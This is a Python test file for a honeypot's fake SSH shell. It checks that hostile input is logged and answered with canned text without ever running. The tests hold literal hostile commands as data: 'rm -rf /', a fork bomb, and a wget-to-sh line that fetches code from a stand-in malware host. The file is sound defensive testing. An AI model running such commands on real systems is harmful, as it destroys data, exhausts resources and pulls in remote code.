"""Tests for the simulated shell.

These tests prove the safety guarantee from the attacker's side: hostile
input (``rm -rf /``, a fork bomb, a download-and-pipe one-liner) produces only
a logged database row and a canned string — never a side effect.
"""

from __future__ import annotations

from pathlib import Path

from honeypot import events
from honeypot.config import DEFAULT
from honeypot.db import connect
from honeypot.fake_shell import MOTD, PROMPT, resolve_command, run_shell


class FakeChannel:
    """An in-memory stand-in for a paramiko Channel.

    ``recv`` yields the queued input chunks then returns ``b""`` (EOF); ``send``
    accumulates everything written so tests can inspect the transcript.
    """

    def __init__(self, inputs: list[bytes]) -> None:
        self._inputs = list(inputs)
        self.sent = b""

    def recv(self, _n: int) -> bytes:
        if self._inputs:
            return self._inputs.pop(0)
        return b""  # EOF

    def send(self, data: str | bytes) -> int:
        chunk = data.encode() if isinstance(data, str) else data
        self.sent += chunk
        return len(chunk)

    def settimeout(self, _t: float) -> None:  # pragma: no cover - noop for tests
        pass


def test_resolve_known_commands() -> None:
    """Canned commands return their expected, hard-coded output."""
    assert resolve_command("whoami") == "root\n"
    assert "uid=0(root)" in resolve_command("id")
    assert "Linux web-prod-01" in resolve_command("uname -a")
    assert "root:x:0:0:root" in resolve_command("cat /etc/passwd")
    assert "GenuineIntel" in resolve_command("cat /proc/cpuinfo")
    assert resolve_command("pwd") == "/root\n"


def test_resolve_unknown_command_is_canned_error() -> None:
    """Unknown input returns a bash-style 'command not found' — nothing runs."""
    out = resolve_command("definitely-not-a-real-binary --flag")
    assert out == "bash: definitely-not-a-real-binary: command not found\n"


def test_resolve_first_token_routing() -> None:
    """A command with arguments routes on its first token."""
    # 'cat /etc/passwd' is an exact entry; 'cat /tmp/other' is unknown -> error.
    assert "command not found" not in resolve_command("cat /etc/passwd")
    out = resolve_command("nmap -sV 10.0.0.1")
    assert out == "bash: nmap: command not found\n"


def test_resolve_empty_input() -> None:
    """Blank input yields an empty string, not an error."""
    assert resolve_command("") == ""
    assert resolve_command("   ") == ""


def test_destructive_input_has_no_side_effects(tmp_path: Path) -> None:
    """Feeding 'rm -rf /' only logs a row; the filesystem is untouched."""
    canary = tmp_path / "canary.txt"
    canary.write_text("intact")

    db = tmp_path / "hp.db"
    from honeypot.db import init_db

    init_db(db)
    conn = connect(db)
    try:
        sid = events.start_session(conn, protocol="ssh", src_ip="6.6.6.6", src_port=1)
        channel = FakeChannel([b"rm -rf /\r", b"exit\r"])
        run_shell(channel, sid, conn, DEFAULT)

        # The command was recorded verbatim...
        rows = conn.execute(
            "SELECT command FROM commands WHERE session_id = ?", (sid,)
        ).fetchall()
        assert any("rm -rf /" in r[0] for r in rows)
    finally:
        conn.close()

    # ...and absolutely nothing was executed.
    assert canary.exists()
    assert canary.read_text() == "intact"


def test_fork_bomb_input_is_inert(tmp_path: Path) -> None:
    """A classic fork bomb is logged as text and produces no processes."""
    db = tmp_path / "hp.db"
    from honeypot.db import init_db

    init_db(db)
    conn = connect(db)
    try:
        sid = events.start_session(conn, protocol="ssh", src_ip="7.7.7.7", src_port=2)
        bomb = ":(){ :|:& };:"
        channel = FakeChannel([bomb.encode() + b"\r", b"exit\r"])
        # If this were ever executed the test process would hang/crash; it
        # returns immediately because the line is only looked up in a dict.
        run_shell(channel, sid, conn, DEFAULT)
        rows = conn.execute(
            "SELECT command FROM commands WHERE session_id = ?", (sid,)
        ).fetchall()
        assert any(bomb in r[0] for r in rows)
        # The bomb's first 'token' is unknown, so a canned error came back.
        assert b"command not found" in channel.sent
    finally:
        conn.close()


def test_download_and_pipe_is_inert(tmp_path: Path) -> None:
    """A 'wget ... | sh' payload is logged but never fetched or piped."""
    db = tmp_path / "hp.db"
    from honeypot.db import init_db

    init_db(db)
    conn = connect(db)
    try:
        sid = events.start_session(conn, protocol="ssh", src_ip="8.8.8.8", src_port=3)
        payload = "wget http://malware.example/x.sh -O- | sh"
        channel = FakeChannel([payload.encode() + b"\r", b"exit\r"])
        run_shell(channel, sid, conn, DEFAULT)
        rows = conn.execute(
            "SELECT command FROM commands WHERE session_id = ?", (sid,)
        ).fetchall()
        assert any(payload in r[0] for r in rows)
        # wget returns a canned DNS-failure message; nothing left the host.
        assert b"failure in name resolution" in channel.sent
    finally:
        conn.close()


def test_shell_sends_motd_and_prompt(tmp_path: Path) -> None:
    """The shell greets with the MOTD and prompt before reading input."""
    db = tmp_path / "hp.db"
    from honeypot.db import init_db

    init_db(db)
    conn = connect(db)
    try:
        sid = events.start_session(conn, protocol="ssh", src_ip="1.1.1.1", src_port=4)
        channel = FakeChannel([b"exit\r"])
        run_shell(channel, sid, conn, DEFAULT)
        assert MOTD.encode() in channel.sent
        assert PROMPT.encode() in channel.sent
    finally:
        conn.close()


def test_command_count_cap_is_enforced(tmp_path: Path) -> None:
    """The shell stops after max_commands_per_session is reached."""
    db = tmp_path / "hp.db"
    from honeypot.db import init_db

    init_db(db)
    conn = connect(db)
    config = DEFAULT.with_overrides(max_commands_per_session=5)
    try:
        sid = events.start_session(conn, protocol="ssh", src_ip="2.2.2.2", src_port=5)
        # Send 20 commands; only the first 5 should be recorded.
        inputs = [b"whoami\r"] * 20
        channel = FakeChannel(inputs)
        run_shell(channel, sid, conn, config)
        count = conn.execute(
            "SELECT COUNT(*) FROM commands WHERE session_id = ?", (sid,)
        ).fetchone()[0]
        assert count == 5
    finally:
        conn.close()


def test_long_command_is_truncated(tmp_path: Path) -> None:
    """An over-length command line is bounded by max_command_length."""
    db = tmp_path / "hp.db"
    from honeypot.db import init_db

    init_db(db)
    conn = connect(db)
    config = DEFAULT.with_overrides(max_command_length=32)
    try:
        sid = events.start_session(conn, protocol="ssh", src_ip="3.3.3.3", src_port=6)
        flood = "a" * 5000
        channel = FakeChannel([flood.encode() + b"\r", b"exit\r"])
        run_shell(channel, sid, conn, config)
        row = conn.execute(
            "SELECT command FROM commands WHERE session_id = ?", (sid,)
        ).fetchone()
        assert row is not None
        assert len(row[0]) <= 32
    finally:
        conn.close()
